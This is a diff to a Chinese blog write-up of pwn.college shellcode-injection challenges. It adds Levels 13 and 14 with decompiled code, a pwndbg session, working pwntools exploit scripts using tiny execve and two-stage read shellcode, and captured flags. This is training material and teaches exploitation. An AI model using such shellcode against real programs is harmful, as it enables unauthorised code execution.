@@ -1,5 +1,5 @@
 ---
-title: "Write-ups: Program Security (Shellcode Injection) series"
+title: "Write-ups: Program Security (Shellcode Injection) series (Completed)"
 pubDate: 2024-12-24
 categories: ["Pwn", "Write-ups", "Shellcode"]
 description: "Write-ups for pwn.college binary exploitation series."
@@ -890,7 +890,7 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 }
 ```
 
-不让出现系统调用指令的机器码，绕过方法非常 ez 啊，请看 exp。
+不让出现系统调用原语的机器码，绕过方法非常 ez 啊，请看 exp。
 
 ### Exploit
 
@@ -1081,7 +1081,7 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 }
 ```
 
-还是没难度。首先不允许出现系统调用指令的机器码，其次会在执行 shellcode 前移除前 `0x1000` 字节区块的写权限。由于我们的 shellcode 会去修改自生的指令来绕过不允许出现系统调用指令的机器码，所以肯定不能把 shellcoded 写在前 `0x1000` 字节的区块中，因为程序读了 `0x2000` 字节，所以我们把核心代码写到前 `0x1000` 字节之后即可。至于这前 `0x1000` 字节，我们一个 `nop` 滑铲滑过去就好了。
+还是没难度。首先不允许出现系统调用原语的机器码，其次会在执行 shellcode 前移除前 `0x1000` 字节区块的写权限。由于我们的 shellcode 会去修改自生的指令来绕过不允许出现系统调用原语的机器码，所以肯定不能把 shellcoded 写在前 `0x1000` 字节的区块中，因为程序读了 `0x2000` 字节，所以我们把核心代码写到前 `0x1000` 字节之后即可。至于这前 `0x1000` 字节，我们一个 `nop` 滑铲滑过去就好了。
 
 ### Exploit
 
@@ -2229,3 +2229,636 @@ int main() {
 ### Flag
 
 Flag: `pwn.college{g4UdtC88x4ayx2CjkFQNdxcSBsC.0FOyIDL5cTNxgzW}`
+
+## Level 13
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Write and execute shellcode to read the flag, but this time you only get 12 bytes!
+
+### Write-up
+
+```c del={39, 53} collapse={1-35, 43-49}
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  size_t v3; // rax
+  size_t v4; // rax
+  int fd; // [rsp+2Ch] [rbp-14h]
+  const char **i; // [rsp+30h] [rbp-10h]
+  const char **j; // [rsp+38h] [rbp-8h]
+
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  puts(
+    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
+  puts(
+    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
+  puts(
+    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
+  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
+  for ( fd = 3; fd <= 9999; ++fd )
+    close(fd);
+  for ( i = argv; *i; ++i )
+  {
+    v3 = strlen(*i);
+    memset((void *)*i, 0, v3);
+  }
+  for ( j = envp; *j; ++j )
+  {
+    v4 = strlen(*j);
+    memset((void *)*j, 0, v4);
+  }
+  shellcode = mmap((void *)0x2A318000, 0x1000uLL, 7, 34, 0, 0LL);
+  if ( shellcode != (void *)707887104 )
+    __assert_fail("shellcode == (void *)0x2a318000", "/challenge/babyshell-level-13.c", 0x62u, "main");
+  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x2A318000);
+  puts("Reading 0xc bytes from stdin.\n");
+  shellcode_size = read(0, shellcode, 0xCuLL);
+  if ( !shellcode_size )
+    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-13.c", 0x67u, "main");
+  puts("Removing write permissions from first 4096 bytes of shellcode.\n");
+  if ( mprotect(shellcode, 0x1000uLL, 5) )
+    __assert_fail(
+      "mprotect(shellcode, 4096, PROT_READ|PROT_EXEC) == 0",
+      "/challenge/babyshell-level-13.c",
+      0x6Au,
+      "main");
+  puts("This challenge is about to execute the following shellcode:\n");
+  print_disassembly(shellcode, shellcode_size);
+  puts(&byte_251D);
+  puts("Executing shellcode!\n");
+  ((void (*)(void))shellcode)();
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+12 bytes 是吧，巧了，哥们上一个 exp 就压在 12 bytes 上了。
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import ELF, asm, context, gdb, log, pause, process, remote
+
+context(log_level="debug", terminal="kitty")
+
+FILE = "./babyshell-level-13"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+def send_payload(target, payload):
+    try:
+        target.send(payload)
+    except Exception as e:
+        log.exception(f"An error occurred while sending payload: {e}")
+
+
+def construct_payload():
+    shellcode = """
+    /* execve(path='a', argv=0, envp=0) */
+    /* push b'a\x00' */
+    push 0x61
+    mov rdi, rsp
+    xor esi, esi
+    cdq
+    /* call execve() */
+    mov al, 59 /* 0x3b */
+    syscall
+    """
+
+    return asm(shellcode)
+
+
+def attack(target, payload):
+    try:
+        send_payload(target, payload)
+
+        response = target.recvall(timeout=5)
+
+        return b"pwn.college{" in response
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    try:
+        target = launch()
+        payload = construct_payload()
+
+        if attack(target, payload):
+            log.success("Success! Exiting...")
+
+            pause()
+            exit()
+    except Exception as e:
+        log.exception(f"An error occurred in main: {e}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Flag
+
+Flag: `pwn.college{s_8hupYRZPagLrq6OX3Dd--4PYY.0VOyIDL5cTNxgzW}`
+
+## Level 14
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Write and execute shellcode to read the flag, but this time you only get 6 bytes :)
+
+### Write-up
+
+```c del={39, 46} collapse={1-35}
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  size_t v3; // rax
+  size_t v4; // rax
+  int fd; // [rsp+2Ch] [rbp-14h]
+  const char **i; // [rsp+30h] [rbp-10h]
+  const char **j; // [rsp+38h] [rbp-8h]
+
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  puts(
+    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
+  puts(
+    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
+  puts(
+    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
+  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
+  for ( fd = 3; fd <= 9999; ++fd )
+    close(fd);
+  for ( i = argv; *i; ++i )
+  {
+    v3 = strlen(*i);
+    memset((void *)*i, 0, v3);
+  }
+  for ( j = envp; *j; ++j )
+  {
+    v4 = strlen(*j);
+    memset((void *)*j, 0, v4);
+  }
+  shellcode = mmap((void *)0x2C0A3000, 0x1000uLL, 7, 34, 0, 0LL);
+  if ( shellcode != (void *)738865152 )
+    __assert_fail("shellcode == (void *)0x2c0a3000", "/challenge/babyshell-level-14.c", 0x62u, "main");
+  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x2C0A3000);
+  puts("Reading 0x6 bytes from stdin.\n");
+  shellcode_size = read(0, shellcode, 6uLL);
+  if ( !shellcode_size )
+    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-14.c", 0x67u, "main");
+  puts("This challenge is about to execute the following shellcode:\n");
+  print_disassembly(shellcode, shellcode_size);
+  puts(&byte_24A5);
+  puts("Executing shellcode!\n");
+  ((void (*)(void))shellcode)();
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+6 bytes，看似好像是一件不可能完成的任务，butttt，如果你尝试动态调试会就会发现，`rax` 的值正好可以用于 `syscall` 来调用 `read`；`rdx` 的值正好可以用做 `read` 的第二个参数，指定 `buf` 地址；`rsi` 的值足够大，正好用作 `read` 的第三个参数，指定输入大小。
+
+```asm wrap=false showLineNumbers=false ins={177, 180, 182, 231, 234, 236} del={137} collapse={3-133, 141-142, 147-173, 199-224, 253-275}
+pwndbg> disass main
+Dump of assembler code for function main:
+   0x0000000000001547 <+0>: endbr64
+   0x000000000000154b <+4>: push   rbp
+   0x000000000000154c <+5>: mov    rbp,rsp
+   0x000000000000154f <+8>: sub    rsp,0x40
+   0x0000000000001553 <+12>: mov    DWORD PTR [rbp-0x24],edi
+   0x0000000000001556 <+15>: mov    QWORD PTR [rbp-0x30],rsi
+   0x000000000000155a <+19>: mov    QWORD PTR [rbp-0x38],rdx
+   0x000000000000155e <+23>: mov    rax,QWORD PTR [rip+0x2abb]        # 0x4020 <stdin@@GLIBC_2.2.5>
+   0x0000000000001565 <+30>: mov    ecx,0x0
+   0x000000000000156a <+35>: mov    edx,0x2
+   0x000000000000156f <+40>: mov    esi,0x0
+   0x0000000000001574 <+45>: mov    rdi,rax
+   0x0000000000001577 <+48>: call   0x11d0 <setvbuf@plt>
+   0x000000000000157c <+53>: mov    rax,QWORD PTR [rip+0x2a8d]        # 0x4010 <stdout@@GLIBC_2.2.5>
+   0x0000000000001583 <+60>: mov    ecx,0x0
+   0x0000000000001588 <+65>: mov    edx,0x2
+   0x000000000000158d <+70>: mov    esi,0x0
+   0x0000000000001592 <+75>: mov    rdi,rax
+   0x0000000000001595 <+78>: call   0x11d0 <setvbuf@plt>
+   0x000000000000159a <+83>: lea    rdi,[rip+0xc24]        # 0x21c5
+   0x00000000000015a1 <+90>: call   0x1130 <puts@plt>
+   0x00000000000015a6 <+95>: mov    rax,QWORD PTR [rbp-0x30]
+   0x00000000000015aa <+99>: mov    rax,QWORD PTR [rax]
+   0x00000000000015ad <+102>: mov    rsi,rax
+   0x00000000000015b0 <+105>: lea    rdi,[rip+0xc12]        # 0x21c9
+   0x00000000000015b7 <+112>: mov    eax,0x0
+   0x00000000000015bc <+117>: call   0x1170 <printf@plt>
+   0x00000000000015c1 <+122>: lea    rdi,[rip+0xbfd]        # 0x21c5
+   0x00000000000015c8 <+129>: call   0x1130 <puts@plt>
+   0x00000000000015cd <+134>: mov    edi,0xa
+   0x00000000000015d2 <+139>: call   0x1120 <putchar@plt>
+   0x00000000000015d7 <+144>: lea    rdi,[rip+0xc02]        # 0x21e0
+   0x00000000000015de <+151>: call   0x1130 <puts@plt>
+   0x00000000000015e3 <+156>: lea    rdi,[rip+0xc76]        # 0x2260
+   0x00000000000015ea <+163>: call   0x1130 <puts@plt>
+   0x00000000000015ef <+168>: lea    rdi,[rip+0xce2]        # 0x22d8
+   0x00000000000015f6 <+175>: call   0x1130 <puts@plt>
+   0x00000000000015fb <+180>: lea    rdi,[rip+0xd4e]        # 0x2350
+   0x0000000000001602 <+187>: call   0x1130 <puts@plt>
+   0x0000000000001607 <+192>: mov    DWORD PTR [rbp-0x14],0x3
+   0x000000000000160e <+199>: jmp    0x161e <main+215>
+   0x0000000000001610 <+201>: mov    eax,DWORD PTR [rbp-0x14]
+   0x0000000000001613 <+204>: mov    edi,eax
+   0x0000000000001615 <+206>: call   0x11a0 <close@plt>
+   0x000000000000161a <+211>: add    DWORD PTR [rbp-0x14],0x1
+   0x000000000000161e <+215>: cmp    DWORD PTR [rbp-0x14],0x270f
+   0x0000000000001625 <+222>: jle    0x1610 <main+201>
+   0x0000000000001627 <+224>: mov    rax,QWORD PTR [rbp-0x30]
+   0x000000000000162b <+228>: mov    QWORD PTR [rbp-0x10],rax
+   0x000000000000162f <+232>: jmp    0x165c <main+277>
+   0x0000000000001631 <+234>: mov    rax,QWORD PTR [rbp-0x10]
+   0x0000000000001635 <+238>: mov    rax,QWORD PTR [rax]
+   0x0000000000001638 <+241>: mov    rdi,rax
+   0x000000000000163b <+244>: call   0x1150 <strlen@plt>
+   0x0000000000001640 <+249>: mov    rdx,rax
+   0x0000000000001643 <+252>: mov    rax,QWORD PTR [rbp-0x10]
+   0x0000000000001647 <+256>: mov    rax,QWORD PTR [rax]
+   0x000000000000164a <+259>: mov    esi,0x0
+   0x000000000000164f <+264>: mov    rdi,rax
+   0x0000000000001652 <+267>: call   0x1190 <memset@plt>
+   0x0000000000001657 <+272>: add    QWORD PTR [rbp-0x10],0x8
+   0x000000000000165c <+277>: mov    rax,QWORD PTR [rbp-0x10]
+   0x0000000000001660 <+281>: mov    rax,QWORD PTR [rax]
+   0x0000000000001663 <+284>: test   rax,rax
+   0x0000000000001666 <+287>: jne    0x1631 <main+234>
+   0x0000000000001668 <+289>: mov    rax,QWORD PTR [rbp-0x38]
+   0x000000000000166c <+293>: mov    QWORD PTR [rbp-0x8],rax
+   0x0000000000001670 <+297>: jmp    0x169d <main+342>
+   0x0000000000001672 <+299>: mov    rax,QWORD PTR [rbp-0x8]
+   0x0000000000001676 <+303>: mov    rax,QWORD PTR [rax]
+   0x0000000000001679 <+306>: mov    rdi,rax
+   0x000000000000167c <+309>: call   0x1150 <strlen@plt>
+   0x0000000000001681 <+314>: mov    rdx,rax
+   0x0000000000001684 <+317>: mov    rax,QWORD PTR [rbp-0x8]
+   0x0000000000001688 <+321>: mov    rax,QWORD PTR [rax]
+   0x000000000000168b <+324>: mov    esi,0x0
+   0x0000000000001690 <+329>: mov    rdi,rax
+   0x0000000000001693 <+332>: call   0x1190 <memset@plt>
+   0x0000000000001698 <+337>: add    QWORD PTR [rbp-0x8],0x8
+   0x000000000000169d <+342>: mov    rax,QWORD PTR [rbp-0x8]
+   0x00000000000016a1 <+346>: mov    rax,QWORD PTR [rax]
+   0x00000000000016a4 <+349>: test   rax,rax
+   0x00000000000016a7 <+352>: jne    0x1672 <main+299>
+   0x00000000000016a9 <+354>: mov    r9d,0x0
+   0x00000000000016af <+360>: mov    r8d,0x0
+   0x00000000000016b5 <+366>: mov    ecx,0x22
+   0x00000000000016ba <+371>: mov    edx,0x7
+   0x00000000000016bf <+376>: mov    esi,0x1000
+   0x00000000000016c4 <+381>: mov    edi,0x2c0a3000
+   0x00000000000016c9 <+386>: call   0x1160 <mmap@plt>
+   0x00000000000016ce <+391>: mov    QWORD PTR [rip+0x2963],rax        # 0x4038 <shellcode>
+   0x00000000000016d5 <+398>: mov    rax,QWORD PTR [rip+0x295c]        # 0x4038 <shellcode>
+   0x00000000000016dc <+405>: cmp    rax,0x2c0a3000
+   0x00000000000016e2 <+411>: je     0x1703 <main+444>
+   0x00000000000016e4 <+413>: lea    rcx,[rip+0xdde]        # 0x24c9 <__PRETTY_FUNCTION__.25265>
+   0x00000000000016eb <+420>: mov    edx,0x62
+   0x00000000000016f0 <+425>: lea    rsi,[rip+0xcc9]        # 0x23c0
+   0x00000000000016f7 <+432>: lea    rdi,[rip+0xce2]        # 0x23e0
+   0x00000000000016fe <+439>: call   0x1180 <__assert_fail@plt>
+   0x0000000000001703 <+444>: mov    rax,QWORD PTR [rip+0x292e]        # 0x4038 <shellcode>
+   0x000000000000170a <+451>: mov    rsi,rax
+   0x000000000000170d <+454>: lea    rdi,[rip+0xcec]        # 0x2400
+   0x0000000000001714 <+461>: mov    eax,0x0
+   0x0000000000001719 <+466>: call   0x1170 <printf@plt>
+   0x000000000000171e <+471>: lea    rdi,[rip+0xd0b]        # 0x2430
+   0x0000000000001725 <+478>: call   0x1130 <puts@plt>
+   0x000000000000172a <+483>: mov    rax,QWORD PTR [rip+0x2907]        # 0x4038 <shellcode>
+   0x0000000000001731 <+490>: mov    edx,0x6
+   0x0000000000001736 <+495>: mov    rsi,rax
+   0x0000000000001739 <+498>: mov    edi,0x0
+   0x000000000000173e <+503>: call   0x11b0 <read@plt>
+   0x0000000000001743 <+508>: mov    QWORD PTR [rip+0x28e6],rax        # 0x4030 <shellcode_size>
+   0x000000000000174a <+515>: mov    rax,QWORD PTR [rip+0x28df]        # 0x4030 <shellcode_size>
+   0x0000000000001751 <+522>: test   rax,rax
+   0x0000000000001754 <+525>: jne    0x1775 <main+558>
+   0x0000000000001756 <+527>: lea    rcx,[rip+0xd6c]        # 0x24c9 <__PRETTY_FUNCTION__.25265>
+   0x000000000000175d <+534>: mov    edx,0x67
+   0x0000000000001762 <+539>: lea    rsi,[rip+0xc57]        # 0x23c0
+   0x0000000000001769 <+546>: lea    rdi,[rip+0xcdf]        # 0x244f
+   0x0000000000001770 <+553>: call   0x1180 <__assert_fail@plt>
+   0x0000000000001775 <+558>: lea    rdi,[rip+0xcec]        # 0x2468
+   0x000000000000177c <+565>: call   0x1130 <puts@plt>
+   0x0000000000001781 <+570>: mov    rdx,QWORD PTR [rip+0x28a8]        # 0x4030 <shellcode_size>
+   0x0000000000001788 <+577>: mov    rax,QWORD PTR [rip+0x28a9]        # 0x4038 <shellcode>
+   0x000000000000178f <+584>: mov    rsi,rdx
+   0x0000000000001792 <+587>: mov    rdi,rax
+   0x0000000000001795 <+590>: call   0x12e9 <print_disassembly>
+   0x000000000000179a <+595>: lea    rdi,[rip+0xd04]        # 0x24a5
+   0x00000000000017a1 <+602>: call   0x1130 <puts@plt>
+   0x00000000000017a6 <+607>: lea    rdi,[rip+0xcf9]        # 0x24a6
+   0x00000000000017ad <+614>: call   0x1130 <puts@plt>
+   0x00000000000017b2 <+619>: mov    rax,QWORD PTR [rip+0x287f]        # 0x4038 <shellcode>
+   0x00000000000017b9 <+626>: mov    rdx,rax
+   0x00000000000017bc <+629>: mov    eax,0x0
+   0x00000000000017c1 <+634>: call   rdx
+   0x00000000000017c3 <+636>: lea    rdi,[rip+0xcf2]        # 0x24bc
+   0x00000000000017ca <+643>: call   0x1130 <puts@plt>
+   0x00000000000017cf <+648>: mov    eax,0x0
+   0x00000000000017d4 <+653>: leave
+   0x00000000000017d5 <+654>: ret
+End of assembler dump.
+pwndbg> b *main+634
+Breakpoint 1 at 0x17c1
+pwndbg> r
+Starting program: /home/cub3y0nd/Projects/pwn.college/babyshell-level-14
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/usr/lib/libthread_db.so.1".
+###
+### Welcome to /home/cub3y0nd/Projects/pwn.college/babyshell-level-14!
+###
+
+This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
+as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
+practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
+other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.
+
+Mapped 0x1000 bytes for shellcode at 0x2c0a3000!
+Reading 0x6 bytes from stdin.
+
+
+This challenge is about to execute the following shellcode:
+
+ERROR: Failed to disassemble shellcode! Bytes are:
+
+      Address      |                      Bytes
+--------------------------------------------------------------------
+0x000000002c0a3000 | 0a 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
+Executing shellcode!
+
+
+Breakpoint 1, 0x0000614116b287c1 in main ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+─────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────
+ RAX  0
+ RBX  0x7ffd5ec85d08 —▸ 0x7ffd5ec86c08 ◂— 0
+ RCX  0x71ac56b1b7a4 (write+20) ◂— cmp rax, -0x1000 /* 'H=' */
+ RDX  0x2c0a3000 ◂— 0xa /* '\n' */
+ RDI  0x71ac56bf8710 ◂— 0
+ RSI  0x71ac56bf7643 (_IO_2_1_stdout_+131) ◂— 0xbf8710000000000a /* '\n' */
+ R8   0x614119b31010 ◂— 0
+ R9   7
+ R10  0x614119b312a0 ◂— 0x614119b31
+ R11  0x202
+ R12  1
+ R13  0
+ R14  0x71ac573d0000 (_rtld_global) —▸ 0x71ac573d12e0 —▸ 0x614116b27000 ◂— 0x10102464c457f
+ R15  0
+ RBP  0x7ffd5ec85be0 —▸ 0x7ffd5ec85c80 —▸ 0x7ffd5ec85ce0 ◂— 0
+ RSP  0x7ffd5ec85ba0 ◂— 0
+ RIP  0x614116b287c1 (main+634) ◂— call rdx
+──────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────
+ ► 0x614116b287c1 <main+634>              call   rdx                         <0x2c0a3000>
+
+   0x614116b287c3 <main+636>              lea    rdi, [rip + 0xcf2]     RDI => 0x614116b294bc ◂— '### Goodbye!'
+   0x614116b287ca <main+643>              call   puts@plt                    <puts@plt>
+
+   0x614116b287cf <main+648>              mov    eax, 0                      EAX => 0
+   0x614116b287d4 <main+653>              leave
+   0x614116b287d5 <main+654>              ret
+
+   0x614116b287d6                         nop    word ptr cs:[rax + rax]
+   0x614116b287e0 <__libc_csu_init>       endbr64
+   0x614116b287e4 <__libc_csu_init+4>     push   r15
+   0x614116b287e6 <__libc_csu_init+6>     lea    r15, [rip + 0x2553]         R15 => 0x614
+116b2ad40 (__init_array_start) —▸ 0x614116b282e0 (frame_dummy) ◂— endbr64
+   0x614116b287ed <__libc_csu_init+13>    push   r14
+────────────────────────────────────────[ STACK ]────────────────────────────────────────
+00:0000│ rsp 0x7ffd5ec85ba0 ◂— 0
+01:0008│-038 0x7ffd5ec85ba8 —▸ 0x7ffd5ec85d18 —▸ 0x7ffd5ec86c3f ◂— 0
+02:0010│-030 0x7ffd5ec85bb0 —▸ 0x7ffd5ec85d08 —▸ 0x7ffd5ec86c08 ◂— 0
+03:0018│-028 0x7ffd5ec85bb8 ◂— 0x100000000
+04:0020│-020 0x7ffd5ec85bc0 ◂— 0
+05:0028│-018 0x7ffd5ec85bc8 ◂— 0x2710573b83e0
+06:0030│-010 0x7ffd5ec85bd0 —▸ 0x7ffd5ec85d10 ◂— 0
+07:0038│-008 0x7ffd5ec85bd8 —▸ 0x7ffd5ec85df0 ◂— 0
+──────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────
+ ► 0   0x614116b287c1 main+634
+   1   0x71ac56a34e08
+   2   0x71ac56a34ecc __libc_start_main+140
+   3   0x614116b2822e _start+46
+─────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> ni
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000000002c0a3000 in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
+ RAX  0
+ RBX  0x7ffd5ec85d08 —▸ 0x7ffd5ec86c08 ◂— 0
+ RCX  0x71ac56b1b7a4 (write+20) ◂— cmp rax, -0x1000 /* 'H=' */
+ RDX  0x2c0a3000 ◂— 0xa /* '\n' */
+ RDI  0x71ac56bf8710 ◂— 0
+ RSI  0x71ac56bf7643 (_IO_2_1_stdout_+131) ◂— 0xbf8710000000000a /* '\n' */
+ R8   0x614119b31010 ◂— 0
+ R9   7
+ R10  0x614119b312a0 ◂— 0x614119b31
+ R11  0x202
+ R12  1
+ R13  0
+ R14  0x71ac573d0000 (_rtld_global) —▸ 0x71ac573d12e0 —▸ 0x614116b27000 ◂— 0x10102464c457f
+ R15  0
+ RBP  0x7ffd5ec85be0 —▸ 0x7ffd5ec85c80 —▸ 0x7ffd5ec85ce0 ◂— 0
+*RSP  0x7ffd5ec85b98 —▸ 0x614116b287c3 (main+636) ◂— lea rdi, [rip + 0xcf2]
+*RIP  0x2c0a3000 ◂— 0xa /* '\n' */
+────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
+ ► 0x2c0a3000    or     al, byte ptr [rax]
+   0x2c0a3002    add    byte ptr [rax], al
+   0x2c0a3004    add    byte ptr [rax], al
+   0x2c0a3006    add    byte ptr [rax], al
+   0x2c0a3008    add    byte ptr [rax], al
+   0x2c0a300a    add    byte ptr [rax], al
+   0x2c0a300c    add    byte ptr [rax], al
+   0x2c0a300e    add    byte ptr [rax], al
+   0x2c0a3010    add    byte ptr [rax], al
+   0x2c0a3012    add    byte ptr [rax], al
+   0x2c0a3014    add    byte ptr [rax], al
+─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7ffd5ec85b98 —▸ 0x614116b287c3 (main+636) ◂— lea rdi, [rip + 0xcf2]
+01:0008│-040 0x7ffd5ec85ba0 ◂— 0
+02:0010│-038 0x7ffd5ec85ba8 —▸ 0x7ffd5ec85d18 —▸ 0x7ffd5ec86c3f ◂— 0
+03:0018│-030 0x7ffd5ec85bb0 —▸ 0x7ffd5ec85d08 —▸ 0x7ffd5ec86c08 ◂— 0
+04:0020│-028 0x7ffd5ec85bb8 ◂— 0x100000000
+05:0028│-020 0x7ffd5ec85bc0 ◂— 0
+06:0030│-018 0x7ffd5ec85bc8 ◂— 0x2710573b83e0
+07:0038│-010 0x7ffd5ec85bd0 —▸ 0x7ffd5ec85d10 ◂— 0
+───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
+ ► 0       0x2c0a3000
+   1   0x614116b287c3 main+636
+   2   0x71ac56a34e08
+   3   0x71ac56a34ecc __libc_start_main+140
+   4   0x614116b2822e _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg>
+```
+
+来来来，我们看看 stage_1 的 shellcode 编译出来占多少字节：
+
+```asm
+.global _start
+.intel_syntax noprefix
+
+_start:
+  xor edi, edi
+  xchg esi, edx
+  syscall
+```
+
+```asm
+0000000000401000 <_start>:
+  401000:       31 ff                   xor    edi,edi
+  401002:       87 d6                   xchg   esi,edx
+  401004:       0f 05                   syscall
+```
+
+GG 正好 6 bytes！笑不动了哈哈哈。
+
+现在，有了 stage_1 的辅助，stage_2 该怎么办不用多说了吧 xD
+
+唯一有一点需要注意的就是执行 stage_2 之前应该使用 `nop` 填充 stage_1 所用的所有指令位，这样才能确保从正确的地方接着执行，因为 `rip` 的值一直在改变。
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import ELF, asm, context, gdb, log, pause, process, remote, shellcraft
+
+context(log_level="debug", terminal="kitty")
+
+FILE = "./babyshell-level-14"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+def send_payload(target, payload):
+    try:
+        target.send(payload)
+    except Exception as e:
+        log.exception(f"An error occurred while sending payload: {e}")
+
+
+def construct_payload(stage):
+    stage_1 = """
+    xor edi, edi
+    xchg esi, edx
+    syscall
+    """
+
+    stage_2 = shellcraft.nop() * len(asm(stage_1))
+    stage_2 += shellcraft.cat("/flag")
+
+    if stage == 1:
+        return asm(stage_1)
+    elif stage == 2:
+        return asm(stage_2)
+    else:
+        log.failure("Unknown stage number.")
+
+
+def attack(target, payload):
+    try:
+        send_payload(target, payload)
+
+        response = target.recvall(timeout=5)
+
+        return b"pwn.college{" in response
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    try:
+        target = launch()
+        payload = construct_payload(1)
+
+        send_payload(target, payload)
+
+        payload = construct_payload(2)
+
+        if attack(target, payload):
+            log.success("Success! Exiting...")
+
+            pause()
+            exit()
+    except Exception as e:
+        log.exception(f"An error occurred in main: {e}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Flag
+
+Flag: `pwn.college{0PaZanWijSYussIikuZaDrCAj1-.0FMzIDL5cTNxgzW}`
+
+## 后记
+
+没想到时隔三天又要写后记了。这章 3 天就打完了，爽快！
+
+~Shellcode Injection 应该是最简单的一章了，不接受反驳。~
+
+Well. 接下来我想嗨几天，虽然不知道可以干什么，但是我清楚的知道我这个小苦逼之后的 roadmap 是刷 ROP -> FmtStr ……
